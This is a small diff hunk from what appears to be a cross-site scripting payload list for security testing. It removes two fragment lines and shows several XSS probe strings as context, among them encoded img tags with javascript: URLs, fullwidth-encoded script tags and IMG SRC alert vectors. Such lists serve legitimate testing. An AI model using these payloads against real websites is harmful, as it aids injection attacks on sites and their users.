@@ -6,8 +6,7 @@
 
 >%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
 '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
-">
->"
+
 '';!--"<XSS>=&{()}
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
